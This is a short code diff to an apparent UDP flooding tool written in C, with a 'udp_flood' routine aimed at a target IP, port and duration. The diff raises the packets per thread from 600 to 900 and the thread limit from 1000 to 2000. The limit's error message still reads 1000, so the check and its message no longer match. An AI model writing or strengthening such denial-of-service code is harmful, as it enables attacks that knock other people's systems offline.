@@ -15,7 +15,7 @@ int target_port;
 char target_ip[16];
 int duration;
 int threads;
-int pps_per_thread = 600;  // Adjusted for AWS safety
+int pps_per_thread = 900;  // Adjusted for AWS safety
 
 // Function to generate randomized UDP flood packets
 void *udp_flood(void *arg) {
@@ -67,7 +67,7 @@ int main(int argc, char *argv[]) {
     duration = atoi(argv[3]);
     threads = atoi(argv[4]);
 
-    if (threads > 1000) {
+    if (threads > 2000) {
         printf("Max 1000 threads allowed!\n");
         return 1;
     }
